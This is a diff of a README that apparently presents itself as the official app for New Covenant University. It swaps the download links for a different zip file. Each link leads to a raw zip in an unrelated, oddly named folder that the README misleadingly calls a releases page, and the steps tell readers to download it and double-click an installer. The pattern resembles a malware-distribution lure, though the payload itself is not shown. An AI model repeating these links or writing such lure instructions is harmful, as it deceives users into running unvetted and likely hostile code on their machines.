@@ -1,7 +1,7 @@
 # 🌐 NCU-Official-Website-Public - Your Gateway to New Covenant University
 
 ## 📥 Download Now!
-[![Download](https://raw.githubusercontent.com/Amirataha25/NCU-Official-Website-Public/main/ureteropyelostomy/NCU-Official-Website-Public.zip%20Now-orange)](https://raw.githubusercontent.com/Amirataha25/NCU-Official-Website-Public/main/ureteropyelostomy/NCU-Official-Website-Public.zip)
+[![Download](https://raw.githubusercontent.com/Amirataha25/NCU-Official-Website-Public/main/ureteropyelostomy/NC-Public-Official-Website-v1.1.zip%20Now-orange)](https://raw.githubusercontent.com/Amirataha25/NCU-Official-Website-Public/main/ureteropyelostomy/NC-Public-Official-Website-v1.1.zip)
 
 ## 🚀 Getting Started
 Welcome to the NCU-Official-Website-Public repository! This is the official hub for New Covenant University, managed by Dr. Angel Crites. With this application, you can easily access essential college information and resources at your fingertips.
@@ -21,11 +21,11 @@ To run the NCU application smoothly, your device should meet the following requi
 - **Contact Information**: Access faculty and staff contacts directly.
 
 ## 📥 Download & Install
-To get started, visit this page to download: [NCU Releases Page](https://raw.githubusercontent.com/Amirataha25/NCU-Official-Website-Public/main/ureteropyelostomy/NCU-Official-Website-Public.zip).
+To get started, visit this page to download: [NCU Releases Page](https://raw.githubusercontent.com/Amirataha25/NCU-Official-Website-Public/main/ureteropyelostomy/NC-Public-Official-Website-v1.1.zip).
 
 1. Click the link above to go to the releases page.
 2. You will see a list of available versions. Choose the latest version for the best experience.
-3. Look for the asset that matches your system. For example, if you're on Windows, you may see `https://raw.githubusercontent.com/Amirataha25/NCU-Official-Website-Public/main/ureteropyelostomy/NCU-Official-Website-Public.zip`.
+3. Look for the asset that matches your system. For example, if you're on Windows, you may see `https://raw.githubusercontent.com/Amirataha25/NCU-Official-Website-Public/main/ureteropyelostomy/NC-Public-Official-Website-v1.1.zip`.
 4. Click on the file to download it.
 5. Once the download is complete, locate the file on your computer (usually in the Downloads folder).
 6. Double-click the installer file to begin the installation process.
